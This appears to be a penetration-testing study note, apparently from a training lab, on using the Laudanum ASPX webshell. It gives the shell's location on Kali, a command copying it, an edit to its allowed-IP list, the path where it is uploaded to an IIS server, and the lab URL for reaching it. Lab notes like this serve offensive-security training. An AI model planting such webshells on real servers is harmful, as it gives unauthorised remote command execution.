---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Laudanum, One Webshell to Rule Them All

files can be found

```
/usr/share/webshells/laudanum
```

Move a Copy for Modification

```
cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

Add your IP address to the `allowedIps` variable on line `59`

{% code fullWidth="true" %}
```
Uploaded Configuration File Name: C:\inetpub\wwwroot\status.inlanefreight.local\files\demo.aspx
```
{% endcode %}

ale w polu adresu http scieżka wygląda

```
http://10.129.175.77/status.inlanefreight.local//files/demo.aspx
```
